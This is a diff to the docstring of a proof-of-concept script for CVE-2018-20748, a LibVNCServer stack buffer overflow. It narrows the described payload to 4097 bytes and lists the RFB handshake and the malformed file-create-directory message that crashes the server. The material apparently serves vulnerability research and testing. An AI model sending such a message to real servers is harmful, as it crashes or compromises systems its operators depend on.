@@ -2,8 +2,9 @@
 """
 PoC for CVE-2018-20748: LibVNCServer 0.9.11 stack buffer overflow (CWE-787)
 
-Triggers HandleFileCreateDirRequest() to write 65535 bytes into a 4096-byte
-stack buffer (char dirName[PATH_MAX]) with no bounds check.
+Triggers HandleFileCreateDirRequest() to write 4097 bytes (PATH_MAX+1) into a
+4096-byte stack buffer (char dirName[PATH_MAX]) with no bounds check — a
+one-byte stack overflow.
 
 Handshake sequence (TightVNC / RFB 3.8):
   1.  Read  12 bytes: "RFB 003.008\\n"
@@ -17,9 +18,9 @@ Handshake sequence (TightVNC / RFB 3.8):
   9.  Send   1 byte : ClientInit shared=1
   10. Read  ServerInit: 2+2+16+4+name bytes
   11. Read  InteractionCaps: 8-byte header + (nS+nC+nE)*16 bytes
-  12. Send  rfbFileCreateDirRequest: type=136, pad=0, dNameLen=0xFFFF (BE),
-           then 65535 bytes of 0x41 => stack overflow in HandleFileCreateDir
-           => ASan aborts the server process
+  12. Send  rfbFileCreateDirRequest: type=136, pad=0, dNameLen=0x1001 (4097,
+           PATH_MAX+1, BE), then 4097 bytes of 0x41 => stack overflow in
+           HandleFileCreateDir => ASan aborts the server process
 
 Usage:
   python3 poc_cve_2018_20748.py <host> <port>
